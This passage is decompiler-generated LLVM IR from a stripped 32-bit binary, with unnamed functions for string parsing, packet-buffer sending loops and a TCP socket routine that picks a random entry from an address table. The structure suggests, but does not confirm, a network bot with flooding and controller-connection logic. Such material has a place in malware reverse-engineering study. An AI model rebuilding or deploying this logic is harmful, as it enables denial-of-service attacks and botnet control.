  %v1_8049df9 = sdiv i32 %sext9, 65536
  %v2_8049df9 = call i32 @function_804ed9c(i32 %v1_8049df9)
  store i32 %v2_8049df9, i32* @eax, align 4
  %v1_8049e01 = call i32 @function_804ed9c(i32 %v2_8049df9)
  store i32 2, i32* %stack_var_-168, align 4
  store i8* %stack_var_-100, i8** %stack_var_-204, align 4
  %v5_8049ea2 = call i32 @function_80489a9(i16* %tmp77, i32 20)
  store i8* %stack_var_-100, i8** %stack_var_-204, align 4
  %v5_8049ebc = call i32 @function_80489a9(i16* %tmp77, i32 40)
  store i32 %v0_8049d78, i32* %stack_var_-152, align 4
  store i8* inttoptr (i32 1420 to i8*), i8** %stack_var_-204, align 4
  %v3_8049ef6 = call i32 @function_804d778(i16 1420)
  store i8* %tmp78, i8** %stack_var_-204, align 4
  %v5_8049f23 = call i32 @function_804d644(i32 %v15_8049f11, i32 %v2_8049f0b, i32 20)
  store i8* %tmp76, i8** %stack_var_-204, align 4
  %v5_8049f45 = call i32 @function_804d644(i32 %v15_8049d2d, i32 %v3_8049f45, i32 1400)
  store i8* %tmp79, i8** %stack_var_-204, align 4
  %v5_8049f5d = call i32 @function_80489a9(i16* %tmp80, i32 1432)
  store i8* %v4_8049f97, i8** %stack_var_-204, align 4
  %v8_8049f9a = call i32 @function_804dce8(i32 %v5_8049ce1, i32 %v2_8049d2a, i32 1440, i32 0, i32 %v2_8049f69, i32 16)
  %tmp = icmp ult i32 %stack_var_-32.0, 50
  br i1 %tmp, label %dec_label_pc_8049fc4, label %dec_label_pc_8049fa5

dec_label_pc_8049fa5:                             ; preds = %dec_label_pc_8049d78
  store i8* null, i8** %stack_var_-204, align 4
  %v3_8049fac = call i32 @function_804ba00(i32* null)
  %v7_8049fb9 = icmp ult i32 %v3_8049fac, %v5_8049fb6
  %v1_8049fbb = icmp eq i1 %v7_8049fb9, false
  br i1 %v1_8049fbb, label %dec_label_pc_8049fcc, label %dec_label_pc_8049fc4

dec_label_pc_8049fc4:                             ; preds = %dec_label_pc_8049fa5, %dec_label_pc_8049d78
  %stack_var_-32.1 = phi i32 [ %stack_var_-32.0, %dec_label_pc_8049d78 ], [ 0, %dec_label_pc_8049fa5 ]
  %v4_8049fc4 = add i32 %stack_var_-32.1, 1
  br label %dec_label_pc_8049d78

dec_label_pc_8049fcc:                             ; preds = %dec_label_pc_8049fa5
  store i8* %v4_8049f97, i8** %stack_var_-204, align 4
  %v2_8049fd2 = call i32 @function_804b7d8(i32 %v5_8049ce1)
  store i32 %v2_8049fd2, i32* @eax, align 4
  store i8* null, i8** %stack_var_-204, align 4
  %v2_8049fde = call i32 @function_804f274(i32 0)
  br label %dec_label_pc_8049fe3

dec_label_pc_8049fe3:                             ; preds = %dec_label_pc_8049c58, %dec_label_pc_8049fcc
  %v0_8049feb = phi i32 [ %v2_8049c7e, %dec_label_pc_8049c58 ], [ %v2_8049fde, %dec_label_pc_8049fcc ]
  ret i32 %v0_8049feb

; uselistorder directives
  uselistorder i32 %v1_8049de6, { 2, 1, 0 }
  uselistorder i32 %stack_var_-32.0, { 1, 0 }
  uselistorder i32 %v5_8049ce1, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v4_8049c8b, { 1, 0 }
  uselistorder i8** %stack_var_-204, { 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 23, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8* %stack_var_-100, { 0, 2, 4, 1, 3 }
  uselistorder i32* %stack_var_-152, { 2, 0, 1 }
  uselistorder i32* %stack_var_-80, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @function_804dce8, { 2, 1, 0 }
  uselistorder i8 69, { 1, 2, 0 }
  uselistorder i32 ()* @function_80483ee, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @function_8049520, { 2, 1, 0 }
  uselistorder i32 (i32)* @function_804f120, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @function_8048311, { 3, 2, 1, 0 }
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0, 2 }
  uselistorder i32 %arg2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8049fe3, { 1, 0 }
  uselistorder label %dec_label_pc_8049cfb, { 1, 0 }
  uselistorder label %dec_label_pc_8049cb7, { 1, 0 }
}

define i32 @function_804aaaa(i32 %arg1) local_unnamed_addr {
dec_label_pc_804aaaa:
  %stack_var_-4 = alloca i32, align 4
  %v0_804aaaa = load i32, i32* @ebp, align 4
  store i32 %v0_804aaaa, i32* %stack_var_-4, align 4
  %v4_804aaaa = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_804aaaa, i32* @ebp, align 4
  %v3_804aac7 = call i32 @function_80482b3(i32 %arg1, i32 ptrtoint ([13 x i8]* @global_var_805364d.90 to i32))
  %v3_804aaed = call i32 @function_80482b3(i32 %arg1, i32 ptrtoint ([13 x i8]* @global_var_805365a.92 to i32))
  %v3_804ab09 = call i32 @function_80482b3(i32 %arg1, i32 ptrtoint ([8 x i8]* @global_var_8053667.93 to i32))
  ret i32 %v3_804ab09

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
}

define i32 @function_804ab10(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804ab10:
  %stack_var_-4 = alloca i32, align 4
  %v0_804ab10 = load i32, i32* @ebp, align 4
  store i32 %v0_804ab10, i32* %stack_var_-4, align 4
  %v4_804ab10 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_804ab10, i32* @ebp, align 4
  %v3_804ab2b = call i32 @function_80482b3(i32 %arg1, i32 ptrtoint ([9 x i8]* @global_var_805366f.94 to i32))
  ret i32 %v3_804ab2b

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @function_804ab32(i32 %arg1, i8* %arg2) local_unnamed_addr {
dec_label_pc_804ab32:
  %stack_var_-32 = alloca i8, align 1
  br label %dec_label_pc_804ab56.preheader

dec_label_pc_804ab50:                             ; preds = %dec_label_pc_804ab75
  %v5_804ab50 = add i32 %.pre38, 1
  %v22_804ab50 = inttoptr i32 %v5_804ab50 to i8*
  %v4_804ab53 = add i32 %stack_var_-28.0, 1
  br label %dec_label_pc_804ab56

dec_label_pc_804ab56:                             ; preds = %dec_label_pc_804ab56.preheader, %dec_label_pc_804ab50
  %stack_var_-28.0 = phi i32 [ %v4_804ab53, %dec_label_pc_804ab50 ], [ %stack_var_-28.174, %dec_label_pc_804ab56.preheader ]
  %stack_var_-20.0 = phi i8* [ %v22_804ab50, %dec_label_pc_804ab50 ], [ %stack_var_-20.175, %dec_label_pc_804ab56.preheader ]
  %v3_804ab6a = call i32 @_strlen(i8* %arg2)
  %v7_804ab71 = icmp ult i32 %stack_var_-28.0, %v3_804ab6a
  %v1_804ab73 = icmp eq i1 %v7_804ab71, false
  %.pre38 = ptrtoint i8* %stack_var_-20.0 to i32
  br i1 %v1_804ab73, label %dec_label_pc_804ab7f, label %dec_label_pc_804ab75

dec_label_pc_804ab75:                             ; preds = %dec_label_pc_804ab56
  %v2_804ab78 = load i8, i8* %stack_var_-20.0, align 1
  %v7_804ab7b = icmp eq i8 %v2_804ab78, 32
  %v1_804ab7d = icmp eq i1 %v7_804ab7b, false
  br i1 %v1_804ab7d, label %dec_label_pc_804ab50, label %dec_label_pc_804ab7f

dec_label_pc_804ab7f:                             ; preds = %dec_label_pc_804ab56, %dec_label_pc_804ab75
  %v5_804ab7f = add i32 %.pre38, 1
  %v3_804ab96 = call i32 @_strlen(i8* %arg2)
  %v4_804ab96 = mul i32 %v3_804ab96, -1
  %v1_804ab9c = sub i32 0, %v4_804ab96
  %v2_804ab9d = sub i32 0, %v4_804ab96
  %v12_804ab9d = icmp eq i32 %stack_var_-28.0, %v2_804ab9d
  br i1 %v12_804ab9d, label %dec_label_pc_804ad75, label %dec_label_pc_804aba5

dec_label_pc_804aba5:                             ; preds = %dec_label_pc_804ab7f
  %v22_804ab7f = inttoptr i32 %v5_804ab7f to i8*
  %v4_804aba5 = add nuw nsw i32 %storemerge1376, 1
  %v7_804abac = icmp sgt i32 %storemerge1376, 3
  br i1 %v7_804abac, label %dec_label_pc_804abba.preheader, label %dec_label_pc_804ab56.preheader

dec_label_pc_804ab56.preheader:                   ; preds = %dec_label_pc_804ab32, %dec_label_pc_804aba5
  %storemerge1376 = phi i32 [ 0, %dec_label_pc_804ab32 ], [ %v4_804aba5, %dec_label_pc_804aba5 ]
  %stack_var_-20.175 = phi i8* [ %arg2, %dec_label_pc_804ab32 ], [ %v22_804ab7f, %dec_label_pc_804aba5 ]
  %stack_var_-28.174 = phi i32 [ 0, %dec_label_pc_804ab32 ], [ %stack_var_-28.0, %dec_label_pc_804aba5 ]
  br label %dec_label_pc_804ab56

dec_label_pc_804abba.preheader:                   ; preds = %dec_label_pc_804aba5
  br label %dec_label_pc_804abba

dec_label_pc_804abb7:                             ; preds = %dec_label_pc_804abd9
  %v4_804abb7 = add i32 %storemerge12, 1
  br label %dec_label_pc_804abba

dec_label_pc_804abba:                             ; preds = %dec_label_pc_804abba.preheader, %dec_label_pc_804abb7
  %storemerge12 = phi i32 [ %v4_804abb7, %dec_label_pc_804abb7 ], [ 0, %dec_label_pc_804abba.preheader ]
  %v3_804abce = call i32 @_strlen(i8* %v22_804ab7f)
  %v7_804abd5 = icmp ult i32 %storemerge12, %v3_804abce
  %v1_804abd7 = icmp eq i1 %v7_804abd5, false
  %.pre = add i32 %storemerge12, %v5_804ab7f
  br i1 %v1_804abd7, label %dec_label_pc_804abba.dec_label_pc_804abe6_crit_edge, label %dec_label_pc_804abd9

dec_label_pc_804abba.dec_label_pc_804abe6_crit_edge: ; preds = %dec_label_pc_804abba
  %.pre27 = inttoptr i32 %.pre to i8*
  br label %dec_label_pc_804abe6

dec_label_pc_804abd9:                             ; preds = %dec_label_pc_804abba
  %v1_804abdf = inttoptr i32 %.pre to i8*
  %v2_804abdf = load i8, i8* %v1_804abdf, align 1
  %v7_804abe2 = icmp eq i8 %v2_804abdf, 32
  %v1_804abe4 = icmp eq i1 %v7_804abe2, false
  br i1 %v1_804abe4, label %dec_label_pc_804abb7, label %dec_label_pc_804abe6

dec_label_pc_804abe6:                             ; preds = %dec_label_pc_804abd9, %dec_label_pc_804abba.dec_label_pc_804abe6_crit_edge
  %v1_804abec.pre-phi = phi i8* [ %.pre27, %dec_label_pc_804abba.dec_label_pc_804abe6_crit_edge ], [ %v1_804abdf, %dec_label_pc_804abd9 ]
  store i8 0, i8* %v1_804abec.pre-phi, align 1
  %v0_804abef = load i32, i32* @global_var_8058c64.80, align 4
  %v3_804abfe = call i32 @function_804d65c(i8* %v22_804ab7f, i32 %v0_804abef)
  %v1_804ac03 = icmp eq i32 %v3_804abfe, 0
  %v1_804ac05 = icmp eq i1 %v1_804ac03, false
  br i1 %v1_804ac05, label %dec_label_pc_804ad75, label %dec_label_pc_804ac0b

dec_label_pc_804ac0b:                             ; preds = %dec_label_pc_804abe6
  %v0_804ac0b = load i64, i64* @global_var_80564ac.12, align 8
  %v1_804ac0b = trunc i64 %v0_804ac0b to i32
  %v1_804ac10 = icmp eq i32 %v1_804ac0b, 0
  %v1_804ac12 = icmp eq i1 %v1_804ac10, false
  br i1 %v1_804ac12, label %dec_label_pc_804ad75, label %dec_label_pc_804ac18

dec_label_pc_804ac18:                             ; preds = %dec_label_pc_804ac0b
  br label %dec_label_pc_804ac34.preheader

dec_label_pc_804ac2e:                             ; preds = %dec_label_pc_804ac53
  %v5_804ac2e = add i32 %.pre37, 1
  %v22_804ac2e = inttoptr i32 %v5_804ac2e to i8*
  %v4_804ac31 = add i32 %stack_var_-28.2, 1
  br label %dec_label_pc_804ac34

dec_label_pc_804ac34:                             ; preds = %dec_label_pc_804ac34.preheader, %dec_label_pc_804ac2e
  %stack_var_-28.2 = phi i32 [ %v4_804ac31, %dec_label_pc_804ac2e ], [ %stack_var_-28.371, %dec_label_pc_804ac34.preheader ]
  %stack_var_-20.2 = phi i8* [ %v22_804ac2e, %dec_label_pc_804ac2e ], [ %stack_var_-20.372, %dec_label_pc_804ac34.preheader ]
  %v3_804ac48 = call i32 @_strlen(i8* %arg2)
  %v7_804ac4f = icmp ult i32 %stack_var_-28.2, %v3_804ac48
  %v1_804ac51 = icmp eq i1 %v7_804ac4f, false
  %.pre37 = ptrtoint i8* %stack_var_-20.2 to i32
  br i1 %v1_804ac51, label %dec_label_pc_804ac5d, label %dec_label_pc_804ac53

dec_label_pc_804ac53:                             ; preds = %dec_label_pc_804ac34
  %v2_804ac56 = load i8, i8* %stack_var_-20.2, align 1
  %v7_804ac59 = icmp eq i8 %v2_804ac56, 32
  %v1_804ac5b = icmp eq i1 %v7_804ac59, false
  br i1 %v1_804ac5b, label %dec_label_pc_804ac2e, label %dec_label_pc_804ac5d

dec_label_pc_804ac5d:                             ; preds = %dec_label_pc_804ac34, %dec_label_pc_804ac53
  %v5_804ac5d = add i32 %.pre37, 1
  %v3_804ac74 = call i32 @_strlen(i8* %arg2)
  %v4_804ac74 = mul i32 %v3_804ac74, -1
  %v1_804ac7a = sub i32 0, %v4_804ac74
  %v2_804ac7b = sub i32 0, %v4_804ac74
  %v12_804ac7b = icmp eq i32 %stack_var_-28.2, %v2_804ac7b
  br i1 %v12_804ac7b, label %dec_label_pc_804ad75, label %dec_label_pc_804ac83

dec_label_pc_804ac83:                             ; preds = %dec_label_pc_804ac5d
  %v22_804ac5d = inttoptr i32 %v5_804ac5d to i8*
  %v4_804ac83 = add nuw nsw i32 %storemerge1173, 1
  %v7_804ac8a = icmp sgt i32 %storemerge1173, 1
  br i1 %v7_804ac8a, label %dec_label_pc_804ac98.preheader, label %dec_label_pc_804ac34.preheader

dec_label_pc_804ac34.preheader:                   ; preds = %dec_label_pc_804ac18, %dec_label_pc_804ac83
  %storemerge1173 = phi i32 [ 0, %dec_label_pc_804ac18 ], [ %v4_804ac83, %dec_label_pc_804ac83 ]
  %stack_var_-20.372 = phi i8* [ %arg2, %dec_label_pc_804ac18 ], [ %v22_804ac5d, %dec_label_pc_804ac83 ]
  %stack_var_-28.371 = phi i32 [ 0, %dec_label_pc_804ac18 ], [ %stack_var_-28.2, %dec_label_pc_804ac83 ]
  br label %dec_label_pc_804ac34

dec_label_pc_804ac98.preheader:                   ; preds = %dec_label_pc_804ac83
  br label %dec_label_pc_804ac98

dec_label_pc_804ac95:                             ; preds = %dec_label_pc_804acb7
  %v4_804ac95 = add i32 %storemerge, 1
  br label %dec_label_pc_804ac98

dec_label_pc_804ac98:                             ; preds = %dec_label_pc_804ac98.preheader, %dec_label_pc_804ac95
  %storemerge = phi i32 [ %v4_804ac95, %dec_label_pc_804ac95 ], [ 0, %dec_label_pc_804ac98.preheader ]
  store i32 %storemerge, i32* @edx, align 4
  store i1 false, i1* @df, align 1
  store i32 %v5_804ac5d, i32* @edi, align 4
  %v3_804acac = call i32 @_strlen(i8* %v22_804ac5d)
  %v0_804acb3 = load i32, i32* @edx, align 4
  %v7_804acb3 = icmp ult i32 %v0_804acb3, %v3_804acac
  %v1_804acb5 = icmp eq i1 %v7_804acb3, false
  %.pre28 = add i32 %storemerge, %v5_804ac5d
  br i1 %v1_804acb5, label %dec_label_pc_804ac98.dec_label_pc_804acc4_crit_edge, label %dec_label_pc_804acb7

dec_label_pc_804ac98.dec_label_pc_804acc4_crit_edge: ; preds = %dec_label_pc_804ac98
  %.pre35 = inttoptr i32 %.pre28 to i8*
  br label %dec_label_pc_804acc4

dec_label_pc_804acb7:                             ; preds = %dec_label_pc_804ac98
  %v1_804acbd = inttoptr i32 %.pre28 to i8*
  %v2_804acbd = load i8, i8* %v1_804acbd, align 1
  %v7_804acc0 = icmp eq i8 %v2_804acbd, 32
  %v1_804acc2 = icmp eq i1 %v7_804acc0, false
  br i1 %v1_804acc2, label %dec_label_pc_804ac95, label %dec_label_pc_804acc4

dec_label_pc_804acc4:                             ; preds = %dec_label_pc_804acb7, %dec_label_pc_804ac98.dec_label_pc_804acc4_crit_edge
  %v1_804acca.pre-phi = phi i8* [ %.pre35, %dec_label_pc_804ac98.dec_label_pc_804acc4_crit_edge ], [ %v1_804acbd, %dec_label_pc_804acb7 ]
  store i8 0, i8* %v1_804acca.pre-phi, align 1
  %v1_804acd3 = call i32 @function_804d880(i32 %v5_804ac5d)
  %v2_804acd3 = trunc i32 %v1_804acd3 to i8
  store i8 %v2_804acd3, i8* %stack_var_-32, align 1
  %sext = mul i32 %v1_804acd3, 16777216
  %tmp = icmp eq i32 %sext, -16777216
  %v1_804ace1 = icmp eq i1 %tmp, false
  br i1 %v1_804ace1, label %dec_label_pc_804acc4._crit_edge, label %dec_label_pc_804ace3

dec_label_pc_804acc4._crit_edge:                  ; preds = %dec_label_pc_804acc4
  br label %bb

dec_label_pc_804ace3:                             ; preds = %dec_label_pc_804acc4
  %v1_804ace9 = call i32 @function_804d8a8(i32 %v5_804ac5d)
  %v4_804acf1 = icmp eq i32 %v1_804ace9, 0
  %v1_804acf5 = icmp eq i1 %v4_804acf1, false
  br i1 %v1_804acf5, label %dec_label_pc_804ad15, label %dec_label_pc_804acf7

dec_label_pc_804acf7:                             ; preds = %dec_label_pc_804ace3
  %v2_804ad0e = call i32 @function_80482b3(i32 %arg1, i32 ptrtoint ([93 x i8]* @global_var_8053678.95 to i32))
  br label %dec_label_pc_804ad75

dec_label_pc_804ad15:                             ; preds = %dec_label_pc_804ace3
  %v1_804ad18 = add i32 %v1_804ace9, 12
  %v2_804ad18 = inttoptr i32 %v1_804ad18 to i32*
  %v3_804ad18 = load i32, i32* %v2_804ad18, align 4
  %v1_804ad20 = add i32 %v1_804ace9, 16
  %v2_804ad20 = inttoptr i32 %v1_804ad20 to i32*
  %v3_804ad20 = load i32, i32* %v2_804ad20, align 4
  %v1_804ad23 = inttoptr i32 %v3_804ad20 to i32*
  %v2_804ad23 = load i32, i32* %v1_804ad23, align 4
  %v1_804ad2a = inttoptr i32 %v2_804ad23 to i8*
  %v7_804ad2d = call i8* @_memcpy(i8* nonnull %stack_var_-32, i8* %v1_804ad2a, i32 %v3_804ad18)
  %v2_804ad3a.pre = load i8, i8* %stack_var_-32, align 1
  br label %bb

bb:                                               ; preds = %dec_label_pc_804acc4._crit_edge, %dec_label_pc_804ad15
  %v2_804ad3a = phi i8 [ %v2_804acd3, %dec_label_pc_804acc4._crit_edge ], [ %v2_804ad3a.pre, %dec_label_pc_804ad15 ]
  store i8 %v2_804ad3a, i8* bitcast (i8** @global_var_80564ab.96 to i8*), align 4
  store i8 0, i8* bitcast (i8** @global_var_80564a8.11 to i8*), align 4
  store i64 256, i64* @global_var_80564ac.12, align 8
  br label %dec_label_pc_804ad75

dec_label_pc_804ad75:                             ; preds = %dec_label_pc_804ab7f, %dec_label_pc_804ac5d, %dec_label_pc_804ac0b, %dec_label_pc_804abe6, %dec_label_pc_804acf7, %bb
  %v0_804ad7b = phi i32 [ %v1_804ac0b, %dec_label_pc_804ac0b ], [ %v3_804abfe, %dec_label_pc_804abe6 ], [ %v2_804ad0e, %dec_label_pc_804acf7 ], [ ptrtoint (i8** @global_var_80564a8.11 to i32), %bb ], [ %v1_804ac7a, %dec_label_pc_804ac5d ], [ %v1_804ab9c, %dec_label_pc_804ab7f ]
  ret i32 %v0_804ad7b

; uselistorder directives
  uselistorder i32 %.pre28, { 1, 0 }
  uselistorder i32 %storemerge, { 0, 2, 1 }
  uselistorder i32 %storemerge1173, { 1, 0 }
  uselistorder i32 %v5_804ac5d, { 1, 2, 0, 3, 4 }
  uselistorder i8* %stack_var_-20.2, { 1, 0 }
  uselistorder i32 %stack_var_-28.2, { 2, 0, 1, 3 }
  uselistorder i32 %.pre, { 1, 0 }
  uselistorder i32 %storemerge12, { 1, 0, 2 }
  uselistorder i32 %storemerge1376, { 1, 0 }
  uselistorder i8* %stack_var_-20.0, { 1, 0 }
  uselistorder i32 %stack_var_-28.0, { 2, 0, 1, 3 }
  uselistorder i8** @global_var_80564a8.11, { 6, 0, 5, 4, 3, 2, 1 }
  uselistorder i32 (i32, i32)* @function_80482b3, { 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 1, 0, 8, 7, 6, 5, 4, 3, 2 }
  uselistorder i64* @global_var_80564ac.12, { 6, 5, 0, 4, 3, 2, 1 }
  uselistorder i8* %arg2, { 1, 2, 3, 0, 4, 5 }
  uselistorder label %dec_label_pc_804ad75, { 5, 4, 1, 2, 3, 0 }
  uselistorder label %bb, { 1, 0 }
  uselistorder label %dec_label_pc_804ac98, { 1, 0 }
  uselistorder label %dec_label_pc_804ac34.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_804ac5d, { 1, 0 }
  uselistorder label %dec_label_pc_804abba, { 1, 0 }
  uselistorder label %dec_label_pc_804ab56.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_804ab7f, { 1, 0 }
}

define i32 @function_804ad7c() local_unnamed_addr {
dec_label_pc_804ad7c:
  %stack_var_-4 = alloca i32, align 4
  %v0_804ad7c = load i32, i32* @ebp, align 4
  store i32 %v0_804ad7c, i32* %stack_var_-4, align 4
  %v4_804ad7c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_804ad7c, i32* @ebp, align 4
  %v0_804ad82 = load i32, i32* @global_var_8058c64.80, align 4
  %v1_804ad8a = call i32 @function_804eac9(i32 %v0_804ad82)
  store i32 %v1_804ad8a, i32* @eax, align 4
  %v0_804ad8f = call i32 @function_80484c9()
  store i32 %v0_804ad8f, i32* @global_var_8058c64.80, align 4
  ret i32 %v0_804ad8f

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @function_804ad9b(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804ad9b:
  %tmp11 = inttoptr i32 %arg2 to i8*
  %v4_804adb1 = ptrtoint i8* %arg1 to i32
  br label %dec_label_pc_804adae

dec_label_pc_804adab:                             ; preds = %dec_label_pc_804adcd
  %v4_804adab = add i32 %storemerge, 1
  br label %dec_label_pc_804adae

dec_label_pc_804adae:                             ; preds = %dec_label_pc_804ad9b, %dec_label_pc_804adab
  %storemerge = phi i32 [ %v4_804adab, %dec_label_pc_804adab ], [ 0, %dec_label_pc_804ad9b ]
  store i1 false, i1* @df, align 1
  store i32 %v4_804adb1, i32* @edi, align 4
  %v3_804adc2 = call i32 @_strlen(i8* %arg1)
  %v7_804adc9 = icmp ult i32 %storemerge, %v3_804adc2
  %v1_804adcb = icmp eq i1 %v7_804adc9, false
  %.pre = add i32 %storemerge, %v4_804adb1
  br i1 %v1_804adcb, label %dec_label_pc_804adae.dec_label_pc_804adda_crit_edge, label %dec_label_pc_804adcd

dec_label_pc_804adae.dec_label_pc_804adda_crit_edge: ; preds = %dec_label_pc_804adae
  %.pre10 = inttoptr i32 %.pre to i8*
  br label %dec_label_pc_804adda

dec_label_pc_804adcd:                             ; preds = %dec_label_pc_804adae
  %v1_804add3 = inttoptr i32 %.pre to i8*
  %v2_804add3 = load i8, i8* %v1_804add3, align 1
  %v10_804add6 = icmp eq i8 %v2_804add3, 33
  %v1_804add8 = icmp eq i1 %v10_804add6, false
  br i1 %v1_804add8, label %dec_label_pc_804adab, label %dec_label_pc_804adda

dec_label_pc_804adda:                             ; preds = %dec_label_pc_804adcd, %dec_label_pc_804adae.dec_label_pc_804adda_crit_edge
  %v1_804ade0.pre-phi = phi i8* [ %.pre10, %dec_label_pc_804adae.dec_label_pc_804adda_crit_edge ], [ %v1_804add3, %dec_label_pc_804adcd ]
  store i8 0, i8* %v1_804ade0.pre-phi, align 1
  %v0_804ade3 = load i32, i32* @global_var_8058c64.80, align 4
  %v3_804adf2 = call i32 @function_804d65c(i8* %arg1, i32 %v0_804ade3)
  %v1_804adf7 = icmp eq i32 %v3_804adf2, 0
  %v1_804adf9 = icmp eq i1 %v1_804adf7, false
  br i1 %v1_804adf9, label %dec_label_pc_804ae2e, label %dec_label_pc_804adfb

dec_label_pc_804adfb:                             ; preds = %dec_label_pc_804adda
  %v2_804adfe = load i8, i8* %tmp11, align 1
  %v10_804ae01 = icmp eq i8 %v2_804adfe, 58
  %v1_804ae03 = icmp eq i1 %v10_804ae01, false
  br i1 %v1_804ae03, label %dec_label_pc_804ae08, label %dec_label_pc_804ae05

dec_label_pc_804ae05:                             ; preds = %dec_label_pc_804adfb
  %v5_804ae05 = add i32 %arg2, 1
  %v22_804ae05 = inttoptr i32 %v5_804ae05 to i8*
  br label %dec_label_pc_804ae08

dec_label_pc_804ae08:                             ; preds = %dec_label_pc_804adfb, %dec_label_pc_804ae05
  %stack_var_12.0 = phi i8* [ %tmp11, %dec_label_pc_804adfb ], [ %v22_804ae05, %dec_label_pc_804ae05 ]
  %v0_804ae08 = load i32, i32* @global_var_8058c64.80, align 4
  %v1_804ae0d = icmp eq i32 %v0_804ae08, 0
  br i1 %v1_804ae0d, label %dec_label_pc_804ae1e, label %dec_label_pc_804ae11

dec_label_pc_804ae11:                             ; preds = %dec_label_pc_804ae08
  %v1_804ae19 = call i32 @function_804eac9(i32 %v0_804ae08)
  br label %dec_label_pc_804ae1e

dec_label_pc_804ae1e:                             ; preds = %dec_label_pc_804ae08, %dec_label_pc_804ae11
  %v4_804ae1e = ptrtoint i8* %stack_var_12.0 to i32
  %v1_804ae24 = call i32 @function_804d694(i32 %v4_804ae1e)
  store i32 %v1_804ae24, i32* @global_var_8058c64.80, align 4
  br label %dec_label_pc_804ae2e

dec_label_pc_804ae2e:                             ; preds = %dec_label_pc_804adda, %dec_label_pc_804ae1e
  %v0_804ae33 = phi i32 [ %v3_804adf2, %dec_label_pc_804adda ], [ %v1_804ae24, %dec_label_pc_804ae1e ]
  ret i32 %v0_804ae33

; uselistorder directives
  uselistorder i32 %.pre, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2 }
  uselistorder i8* %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804ae2e, { 1, 0 }
  uselistorder label %dec_label_pc_804ae1e, { 1, 0 }
  uselistorder label %dec_label_pc_804ae08, { 1, 0 }
  uselistorder label %dec_label_pc_804adae, { 1, 0 }
}

define i32 @function_804ae34() local_unnamed_addr {
dec_label_pc_804ae34:
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804ae34 = load i32, i32* @ebp, align 4
  store i32 %v0_804ae34, i32* %stack_var_-4, align 4
  %v4_804ae34 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_804ae34, i32* @ebp, align 4
  %v2_804af0a = ptrtoint i32* %stack_var_-32 to i32
  %v2_804af0d = ptrtoint i32* %stack_var_-28 to i32
  %v2_804af59 = ptrtoint i32* %stack_var_-36 to i32
  br label %dec_label_pc_804ae3c

dec_label_pc_804ae3c:                             ; preds = %dec_label_pc_804ae3c.backedge, %dec_label_pc_804ae34
  store i32 -1, i32* @global_var_8058c68.7, align 8
  store i32 1, i32* %stack_var_-36, align 4
  %v0_804ae4d = load i32, i32* @global_var_80564a0.60, align 32
  store i32 %v0_804ae4d, i32* @eax, align 4
  %v1_804ae52 = icmp eq i32 %v0_804ae4d, 0
  %v1_804ae54 = icmp eq i1 %v1_804ae52, false
  br i1 %v1_804ae54, label %dec_label_pc_804ae79, label %dec_label_pc_804ae56

dec_label_pc_804ae56:                             ; preds = %dec_label_pc_804ae3c
  %v1_804ae56 = call i32 @function_804ed9c(i32 1)
  %v0_804ae5d = load i64, i64* @global_var_8056100.99, align 8
  %sext = mul i64 %v0_804ae5d, 4294967296
  %v5_804ae62 = sdiv i64 %sext, 4294967296
  %v1_804ae67 = ashr i32 %v1_804ae56, 31
  %v6_804ae68 = zext i32 %v1_804ae56 to i64
  %v8_804ae68 = zext i32 %v1_804ae67 to i64
  %v9_804ae68 = mul nuw i64 %v8_804ae68, 4294967296
  %v10_804ae68 = or i64 %v9_804ae68, %v6_804ae68
  %v14_804ae68 = srem i64 %v10_804ae68, %v5_804ae62
  %v15_804ae68 = trunc i64 %v14_804ae68 to i32
  %v1_804ae6d = mul i32 %v15_804ae68, 4
  %v2_804ae6d = add i32 %v1_804ae6d, ptrtoint ([16 x i8]** @global_var_8056104.101 to i32)
  %v3_804ae6d = inttoptr i32 %v2_804ae6d to i32*
  %v4_804ae6d = load i32, i32* %v3_804ae6d, align 4
  store i32 %v4_804ae6d, i32* @global_var_8058d80.59, align 128
  br label %dec_label_pc_804ae79

dec_label_pc_804ae79:                             ; preds = %dec_label_pc_804ae3c, %dec_label_pc_804ae56
  store i32 0, i32* @global_var_80564a0.60, align 32
  br label %dec_label_pc_804ae83

dec_label_pc_804ae83:                             ; preds = %dec_label_pc_804ae83, %dec_label_pc_804ae79
  store i32 2, i32* %stack_var_-60, align 4
  %v3_804ae9a = call i32 @function_804dd68(i32 2, i32 1, i32 6)
  store i32 %v3_804ae9a, i32* @global_var_8058c68.7, align 8
  %v2_804aea9 = icmp slt i32 %v3_804ae9a, 0
  br i1 %v2_804aea9, label %dec_label_pc_804ae83, label %dec_label_pc_804aead

dec_label_pc_804aead:                             ; preds = %dec_label_pc_804ae83
  %v0_804aead = load i32, i32* @global_var_8058d80.59, align 128
  store i32 %v0_804aead, i32* %stack_var_-60, align 4
  %v1_804aeb5 = call i32 @function_804d880(i32 %v0_804aead)
  %v1_804aeba = icmp eq i32 %v1_804aeb5, 0
